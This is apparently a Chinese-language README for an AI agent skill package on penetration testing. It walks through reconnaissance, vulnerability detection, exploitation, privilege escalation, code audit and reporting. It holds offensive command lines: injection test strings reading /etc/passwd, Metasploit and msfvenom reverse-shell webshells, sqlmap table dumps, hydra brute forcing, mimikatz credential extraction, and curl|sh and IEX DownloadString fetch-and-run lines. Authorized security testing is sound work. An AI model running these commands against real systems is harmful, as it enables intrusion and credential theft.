# 🎯 penetration-testing — OpenClaw Skill

> **系统性渗透测试能力包** — 授权安全评估、漏洞挖掘、权限提升、报告生成一体化的 AI 技能集。

---

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **Skill 名称** | `penetration-testing` |
| **安装路径** | `~/.npm-global/lib/node_modules/openclaw/skills/penetration-testing/` |
| **文件构成** | `SKILL.md` + 4 个参考文件 |
| **触发条件** | 渗透测试、安全评估、漏洞验证、渗透报告等意图 |
| **能力覆盖** | 信息收集 → 漏洞检测 → 漏洞利用 → 权限提升 → 代码审计 → 报告生成 |

---

## 📂 文件结构

```
penetration-testing/
├── SKILL.md                         # 主技能定义 — 操作流程与命令速查
└── references/
    ├── tools-commands.md            # 常用工具速查（30+工具）
    ├── middleware-cve.md            # 中间件与 CVE 速查（10+中间件/100+CVE）
    ├── vulnerability-checklist.md   # 漏洞检查清单（200+检查项）
    └── code-audit.md               # 代码审计指南（PHP/Java/Python/JS）
```

---

## 🔄 六阶段操作流程

```
┌─────────────────────────────────────────────────────────────────────┐
│  ① 信息收集  →  ② 漏洞检测  →  ③ 漏洞利用  →  ④ 权限提升         │
│                                       ↕                            │
│                             ⑤ 代码审计（无漏洞时）                   │
│                                       ↓                            │
│                             ⑥ 报告生成                              │
└─────────────────────────────────────────────────────────────────────┘
```

### 阶段一：信息收集

#### 被动收集
| 工具 | 用途 |
|------|------|
| `amass enum -passive -d target.com` | 子域名被动发现 |
| `subfinder -d target.com` | 快速子域名枚举 |
| `theHarvester -d target.com -b all` | 邮件/子域/主机 OSINT |
| `shodan search ip:target_ip` | 互联网空间测绘 |

#### 主动收集
| 工具 | 用途 |
|------|------|
| `nmap -p- -sV -O target.com` | 全端口扫描 + 服务版本 + OS 识别 |
| `masscan -p1-65535 --rate=10000 target` | 高速端口扫描 |
| `whatweb target.com` | Web 技术栈指纹 |
| `gobuster dir -u target.com -w wordlist` | Web 目录爆破 |
| `ffuf -u https://FUZZ.target.com -w wordlist` | 模糊测试 |
| `nikto -h https://target.com` | Web 漏洞粗略扫描 |
| `enum4linux target.com` | Samba/Linux 枚举 |

---

### 阶段二：漏洞检测

#### Web 漏洞
| 漏洞类型 | 检测命令 |
|----------|----------|
| **SQL 注入** | `sqlmap -u "url" --batch --level=5` |
| **XSS** | `xsstrike -u "url"` |
| **SSRF** | 测试 `http://169.254.169.254/` 等内网地址 |
| **RCE** | 测试 `; whoami`、`\| cat /etc/passwd` |
| **LFI/RFI** | 测试 `../../etc/passwd` |
| **文件上传** | 测试文件类型绕过、WebShell 上传 |

#### 中间件漏洞

**Web 服务器**
- Apache: `nmap --script http-apache*`, `searchsploit apache`
- Nginx: `nmap --script http-nginx*`, 版本比对
- IIS: `nmap --script iis*`, CVE-2017-7269 检测

**应用服务器**
- Tomcat: AJP 幽灵猫 (CVE-2020-1938), 默认后台
- JBoss: Java 反序列化 (CVE-2017-12149, CVE-2015-7501)
- WebLogic: T3/IIOP 反序列化, LDAP RCE
- Spring: Spring4Shell (CVE-2022-22965), SpEL 注入

**缓存/消息队列**
- Redis: Lua 沙箱逃逸 (CVE-2022-0543), 未授权访问
- Memcached: 未授权访问, UDP 放大攻击
- RabbitMQ: 默认口令 `guest:guest`
- Elasticsearch: 未授权, Groovy 脚本注入

**容器/云原生**
- Docker API: 未授权 `:2375/version`
- Kubernetes: API Server 未授权 `:6443/api/v1`

#### CVE 漏洞扫描

```bash
# Nmap CVE 脚本
nmap --script=cve*.nse target.com
nmap --script=vuln target.com

# 特定 CVE 检测
nmap --script=cve-2021-44228 target.com   # Log4Shell
nmap --script=cve-2022-22965 target.com   # Spring4Shell

# Exploit 搜索
searchsploit "Apache 2.4.49"
searchsploit "Redis 6.0"
```

#### 高危 CVE 速查

| 服务 | CVE | 影响 | 等级 |
|------|-----|------|------|
| Log4j | CVE-2021-44228 | RCE | 🔴 Critical |
| Spring | CVE-2022-22965 | RCE (Spring4Shell) | 🔴 Critical |
| Apache | CVE-2021-42013 | 路径穿越 + RCE | 🔴 Critical |
| Apache | CVE-2021-41773 | 路径穿越 | 🟠 High |
| Tomcat | CVE-2020-1938 | 文件读取/RCE (幽灵猫) | 🔴 Critical |
| Redis | CVE-2022-0543 | Lua 沙箱逃逸 | 🔴 Critical |
| SMB | CVE-2017-0144 | 永恒之蓝 | 🔴 Critical |
| Docker | CVE-2022-0492 | 容器逃逸 | 🟠 High |
| Kafka | CVE-2023-25194 | 未授权访问 | 🟠 High |

---

### 阶段三：漏洞利用

```bash
# Metasploit
msfconsole
search exploit_name
use exploit/multi/http/some_exploit
set payload generic/shell_reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
exploit

# 生成 Webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPORT=port -f raw > shell.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=port -f elf > shell.elf

# SQL 注入利用
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
```

#### 密码攻击

| 工具 | 命令 | 用途 |
|------|------|------|
| hydra | `hydra -l root -P pass.txt ssh://target` | 在线爆破 |
| hashcat | `hashcat -m 1000 -a 0 hash.txt wordlist.txt` | 离线破解 |
| john | `john --wordlist=pass.txt hash.txt` | 离线破解 |
| mimikatz | `sekurlsa::logonpasswords` | Windows 凭据提取 |

---

### 阶段四：权限提升

#### Linux 提权

```bash
# 信息收集
uname -a                    # 内核版本
sudo -l                     # sudo 权限
cat /etc/crontab            # 计划任务
find / -perm -4000 -type f 2>/dev/null   # SUID 文件
cat /etc/os-release         # 发行版

# 自动化枚举
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Windows 提权

```powershell
systeminfo
whoami /all
wmic qfe list
wmic product get name,version

# 自动化枚举
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')
```

---

### 阶段五：代码审计

当常规扫描未发现漏洞时进入代码审计。

#### 危险函数搜索

| 语言 | 搜索命令 |
|------|----------|
| PHP | `grep -rn "eval\|system\|exec\|mysql_query\|unserialize" --include="*.php"` |
| Java | `grep -rn "executeQuery\|Runtime.exec\|ObjectInputStream" --include="*.java"` |
| Python | `grep -rn "execute\|system\|eval\|pickle.loads" --include="*.py"` |

#### 自动化审计工具

| 工具 | 适用语言 | 命令 |
|------|----------|------|
| Semgrep | 多语言 | `semgrep --config=p/security audits /path` |
| Bandit | Python | `bandit -r ./python_project/` |
| CodeQL | 多语言 | `codeql database create --language=python` |
| SonarQube | 多语言 | Docker 部署 + Web 扫描 |

#### 审计关注点

| 漏洞类型 | 关注要点 |
|----------|----------|
| **SQL 注入** | 字符串拼接、窄过滤（`str_replace`）、伪过滤（`addslashes`） |
| **命令注入** | `system/exec/eval/shell_exec/os.system/subprocess.call` |
| **文件操作** | 路径穿越、NULL 字节截断、URL 编码绕过 |
| **反序列化** | PHP `unserialize`、Java `ObjectInputStream`、Python `pickle.loads` |
| **业务逻辑** | 认证绕过、水平/垂直越权、条件竞争、金额篡改、流程跳过 |

---

### 阶段六：报告生成

#### 报告结构

```
渗透测试报告
├── 1. 执行摘要（1-2 页，管理层决策用）
├── 2. 测试范围（授权信息、目标清单、范围排除）
├── 3. 测试方法（OWASP/PTES/NIST、工具、时间线）
├── 4. 漏洞详情 ★ 核心章节
│   └── 每个漏洞：基本信息 → 定级依据 → 漏洞描述 → 复现步骤
│                            → 截图 → 影响分析 → 修复建议
├── 5. 操作证据（日志、权限、敏感数据）
├── 6. 结论与建议（优先级矩阵、体系化改进、复测建议）
└── 附录（术语、风险等级定义、工具输出、授权文件）
```

#### 漏洞定级标准

| 等级 | 标准 | 修复时限 |
|------|------|----------|
| 🔴 **Critical** | 可直接获取系统最高权限 | 24 小时 |
| 🟠 **High** | 可获取敏感数据或提升权限 | 72 小时 |
| 🟡 **Medium** | 可造成业务影响但需特定条件 | 2 周 |
| 🔵 **Low** | 信息泄露或轻微影响 | 1 个月 |
| ⚪ **Info** | 情报收集，无直接威胁 | 下次迭代 |

---

## 📑 参考文件详解

### 1. `references/tools-commands.md` — 工具速查

覆盖 **30+ 安全工具**，按阶段分组：

| 分类 | 工具列表 |
|------|----------|
| 端口扫描 | nmap, masscan, rustscan |
| 子域名 | subfinder, amass, assetfinder, ffuf |
| Web 枚举 | whatweb, wappalyzer, dirb, gobuster, ffuf |
| DNS 枚举 | dig, dnsenum, fierce |
| OSINT | theHarvester, recon-ng, maltego |
| 漏洞扫描 | nikto, sqlmap, XSStrike, Burp Suite, OWASP ZAP |
| CVE 搜索 | searchsploit, nmap cve 脚本, nuclei |
| Exploit | Metasploit, pwntools, ROPgadget |
| 密码攻击 | hydra, medusa, hashcat, john, mimikatz |
| 代码审计 | Semgrep, Bandit, SonarQube, CodeQL |
| 后渗透 | LinPEAS, WinPEAS, PowerSploit, mimikatz |
| 横向移动 | CrackMapExec, Evil-WinRM, psexec, wmiexec |
| 隧道转发 | sshuttle, chisel, plink, socat |

### 2. `references/middleware-cve.md` — 中间件 CVE 速查

覆盖 **10+ 中间件/服务** 的历史高危漏洞：

| 中间件 | 重点 CVE | 影响 |
|--------|----------|------|
| Apache | CVE-2021-41773, CVE-2021-42013 | 路径穿越 + RCE |
| Nginx | CVE-2021-23017 | 堆缓冲区溢出 |
| IIS | CVE-2017-7269 | 缓冲区溢出 RCE |
| Tomcat | CVE-2020-1938 | AJP 文件读取/RCE |
| JBoss | CVE-2017-12149 | 反序列化 RCE |
| WebLogic | CVE-2021-2109, CVE-2018-2628 | LDAP RCE, 反序列化 |
| Spring | CVE-2022-22965 | Spring4Shell RCE |
| MySQL | UDF 提权, 弱口令 | 数据库控制 |
| Redis | CVE-2022-0543, 未授权 | Lua 沙箱逃逸, SSH 密钥注入 |
| MongoDB | 未授权访问 | 数据泄露 |
| Docker | CVE-2021-41091, CVE-2022-0492 | 容器逃逸 |
| Kubernetes | API 未授权, ETCD 泄露 | 集群控制 |
| Elasticsearch | 未授权, Groovy 注入 | 数据泄露 + RCE |
| RabbitMQ | 默认口令, CVE-2022-2551 | 认证绕过 |

### 3. `references/vulnerability-checklist.md` — 漏洞检查清单

**200+ 检查项**，覆盖完整攻击面：

- **信息收集** — 域名 DNS, Web 指纹, 网络扫描
- **Web 漏洞** — SQLi, 命令注入, SSTI, XXE, XSS, CSRF, SSRF, 文件上传, API 安全
- **服务漏洞** — FTP, SSH, SMTP, SMB, RDP, 数据库, Redis, Memcached
- **中间件 CVE** — Apache, Nginx, IIS, Tomcat, JBoss, WebLogic, Spring
- **权限提升** — Linux(SUID/sudo/内核/cron) + Windows(服务/注册表/令牌) + AD域
- **代码审计** — PHP/Java/Python/JS 危险函数、业务逻辑漏洞

### 4. `references/code-audit.md` — 代码审计指南

覆盖 **4 种语言** 的深度审计方法：

| 语言 | 审计重点 | 危险函数特征 |
|------|----------|-------------|
| **PHP** | SQL 注入、命令注入、文件包含、反序列化、XSS | `mysql_query`、`system`、`include`、`unserialize`、`echo` |
| **Java** | SQL 注入、命令注入、反序列化、SSRF | `Statement`、`Runtime.exec`、`ObjectInputStream`、`URL.openConnection` |
| **Python** | SQL 注入、命令注入、SSTI、反序列化 | f-string 拼接、`os.system`、`render_template_string`、`pickle.loads` |
| **JavaScript** | 命令注入、路径遍历、XSS | `child_process.exec`、`fs.readFile`、`innerHTML`、`eval` |

**业务逻辑审计** — 认证绕过、IDOR 越权、条件竞争、金额篡改、流程跳过

**自动化工具** — Semgrep（推荐）、Bandit、CodeQL、SonarQube、RIPS

---

## 💡 使用场景示例

### 场景 1：Web 应用渗透测试
```
信息收集 → 中间件检测 → CVE 扫描 → Web 漏洞测试 → 代码审计 → 报告
```

### 场景 2：内网渗透
```
获得初始 Shell → 内网信息收集 → CVE 扫描 → 横向移动 → 域控拿下 → 报告
```

### 场景 3：代码审计
```
获取源码 → 目录结构分析 → 危险函数搜索 → 业务逻辑分析 → 漏洞报告
```

---

## ⚠️ 注意事项

- ✅ **始终确保测试授权** — 禁止未授权扫描
- ✅ **高风险操作前评估业务影响** — 避免造成服务中断
- ✅ **敏感数据合规处理** — 符合《个人信息保护法》等法规
- ✅ **报告脱敏** — 交付前移除敏感信息
- ✅ **遵循安全测试规范** — 每步操作有清晰的测试目的

---

## 🔗 关联内容

- 报告模板: [Penetration-Test-Report-Template.md](./Penetration-Test-Report-Template.md) — 基于本技能的 6 案例专业报告模板
- OpenClaw 技能市场: [https://clawhub.ai](https://clawhub.ai)
